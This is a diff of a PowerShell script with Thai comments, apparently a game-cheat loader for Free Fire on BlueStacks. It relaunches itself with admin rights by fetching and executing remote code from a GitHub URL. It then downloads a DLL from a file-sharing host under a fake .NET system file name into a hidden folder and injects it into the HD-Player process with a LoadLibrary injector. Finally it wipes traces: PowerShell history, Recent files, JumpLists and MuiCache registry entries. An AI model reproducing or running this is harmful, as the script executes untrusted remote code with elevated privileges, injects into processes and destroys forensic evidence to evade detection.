@@ -1,26 +1,36 @@
-# 1. ขอสิทธิ์ Administrator (จำเป็นมากสำหรับการ Inject)
+# =========================================================
+# 1. ขอสิทธิ์ Administrator (จำเป็นสำหรับการ Inject)
+# =========================================================
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
 
+# =========================================================
 # 2. ตั้งค่าไฟล์และการพรางตัว
-$url = "https://files.catbox.moe/0ukxya.dll" # ลิงก์ไฟล์ DLL ของคุณ
-$fakeName = "mscories.dll" # ปลอมชื่อให้เหมือนไฟล์ระบบ .NET
+# =========================================================
+$url = "https://files.catbox.moe/0ukxya.dll" 
+$fakeName = "mscories.dll" 
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
-$targetProcess = "HD-Player" # ชื่อโปรเซส BlueStacks โดยไม่ต้องมี .exe
+$targetProcess = "HD-Player" 
 
-# 3. เตรียมที่เก็บไฟล์
+# =========================================================
+# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์ระบบ)
+# =========================================================
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
+# =========================================================
 # 4. ดาวน์โหลด DLL
+# =========================================================
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
 
-# 5. ฟังก์ชันสำหรับ Inject DLL เข้าไปใน BlueStacks (C# Method)
+# =========================================================
+# 5. C# Injector Code (LoadLibrary Method)
+# =========================================================
 $Source = @"
 using System;
 using System.Runtime.InteropServices;
@@ -52,36 +62,54 @@ public class Injector {
 }
 "@
 
-# 6. เริ่มการรัน BlueStacks และ Inject
+# =========================================================
+# 6. ตรวจสอบกระบวนการและทำการ Inject
+# =========================================================
 if (Test-Path $dllPath) {
-    # ตรวจสอบว่า BlueStacks เปิดอยู่ไหม ถ้าไม่เปิดให้เปิดก่อน
     $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     if (!$proc) {
-        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
-        Start-Sleep -Seconds 5 # รอให้โปรเซสขึ้น
-        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+        # ถ้าไม่เจอ ให้พยายามเปิด BlueStacks (ปรับ Path ตามจริง)
+        if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
+            Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+            Start-Sleep -Seconds 8 
+            $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+        }
     }
 
     if ($proc) {
-        # ทำการ Inject DLL เข้าไป
         Add-Type -TypeDefinition $Source
         [Injector]::Inject($proc.Id, $dllPath)
     }
 }
 
-# 7. --- ลบร่องรอย (The Ghost Clean) ---
+# =========================================================
+# 7. --- The Ghost Clean (ลบร่องรอยขั้นสูง) ---
+# =========================================================
 Start-Sleep -Seconds 5
-Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-$historyPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
-Clear-History
 
-# ล้าง Registry MuiCache และ UserAssist เหมือนเดิม
+# ลบไฟล์และโฟลเดอร์
+Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# ล้าง PowerShell History
+Clear-History
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
+
+# ล้างประวัติ Recent Files และ JumpLists (กันคนเช็ค Recent Files)
+$recent = "$env:APPDATA\Microsoft\Windows\Recent"
+Get-ChildItem -Path $recent -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# ล้าง MuiCache ใน Registry
 $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
-    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
+Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*$fakeName*" -or $_.Name -like "*powershell*" } | ForEach-Object {
+    Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -ErrorAction SilentlyContinue
 }
 
-# รีสตาร์ท Explorer เพื่อความเนียน
-Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
-Start-Process Explorer -WindowStyle Hidden
+# รีสตาร์ท Explorer แบบไร้ร่องรอย (ใช้ Job เพื่อให้สคริปต์จบการทำงานได้ทันที)
+Start-Job -ScriptBlock {
+    Stop-Process -Name explorer -Force
+    Start-Sleep -Seconds 1
+    Start-Process explorer
+} | Out-Null
+
+exit
